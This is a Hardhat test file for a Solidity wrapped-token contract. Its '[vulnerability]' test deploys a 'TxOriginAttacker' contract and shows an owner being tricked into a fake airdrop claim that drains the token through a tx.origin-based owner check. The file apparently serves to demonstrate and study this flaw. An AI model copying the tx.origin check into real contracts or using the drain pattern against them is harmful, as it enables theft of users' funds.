import type { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/types";
import { expect } from "chai";
import { network } from "hardhat";
import type { WrappedTokenV2 } from "../types/ethers-contracts/index.js";

const { ethers } = await network.create();

const NAME = "MDD Wrapped Token";
const SYMBOL = "MDD-WETH";

describe("WrappedTokenV2", function () {
  let token: WrappedTokenV2, owner: HardhatEthersSigner, alice: HardhatEthersSigner, bob: HardhatEthersSigner;

  beforeEach(async function () {
    [owner, alice, bob] = await ethers.getSigners();
    token = await ethers.deployContract("WrappedTokenV2", [NAME, SYMBOL, owner.address]);
  });

  describe("emergencyWithdraw", function () {
    const amount = ethers.parseEther("5");

    beforeEach(async function () {
      await token.connect(alice).deposit(amount, { value: amount });
    });

    it("should revert if the caller is not the owner", async function () {
      await expect(token.connect(bob).emergencyWithdraw(bob.address)).to.be.revertedWith("Caller is not the owner");
    });

    it("[vulnerability]", async function () {
      // the owner is tricked into calling a malicious contract that drains the token
      const attacker = await ethers.deployContract("TxOriginAttacker", [await token.getAddress()], bob);

      const tokenBalanceBefore = await ethers.provider.getBalance(token.getAddress());
      const bobEthBalanceBefore = await ethers.provider.getBalance(bob.address);

      // tx.origin is the owner, so the check passes even though msg.sender is the attacker contract
      await attacker.connect(owner).claimAirdrop();

      const tokenBalanceAfter = await ethers.provider.getBalance(token.getAddress());
      expect(tokenBalanceAfter).to.equal(0n);

      // the owner pays the gas, so Bob receives the whole balance
      const bobEthBalanceAfter = await ethers.provider.getBalance(bob.address);
      expect(bobEthBalanceAfter).to.equal(bobEthBalanceBefore + tokenBalanceBefore);
    });
  });
});
